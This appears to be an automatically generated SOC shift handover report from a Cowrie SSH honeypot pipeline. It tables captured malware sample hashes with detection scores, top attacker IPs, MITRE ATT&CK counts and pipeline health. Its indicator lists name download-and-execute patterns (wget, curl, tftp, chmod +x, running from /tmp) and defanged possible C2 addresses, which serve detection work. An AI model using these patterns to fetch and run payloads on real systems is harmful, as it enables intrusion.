| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 67/100 | 🟡 MEDIUM | **18/73** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/73** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `2.58.172[.]185` | GB | rack400.com - UK Infrastructure Tel : +6531595852 | **100** ⚠️ | 3 |
| `65.20.237[.]191` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `178.178.194[.]151` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `114.30.223[.]119` | KR | HVHonam | **100** ⚠️ | 50 |
| `50.217.40[.]11` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `14.49.178[.]90` | KR | Korea Telecom | **100** ⚠️ | 32 |
| `91.92.40[.]176` | NL | TechTies Inc. | **100** ⚠️ | 35 |
| `96.1.40[.]151` | CA | TELUS Mobility-Ontario | **100** ⚠️ | 50 |
| `220.250.52[.]75` | CN | FJFZ-FJFZ-CaiGengTangInfoTech-Corp | **100** ⚠️ | 50 |
| `172.96.182[.]111` | US | HostPapa | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 134 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 127 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 50 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 50 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 50 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 205 cases |
| Tool 34  | Credential Extractor        | ✅ 170 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (5.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 127 priority case(s) shown individually · 16 recon entry/entries in table (3 group(s) consolidating 54 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-08T19:39:20Z_
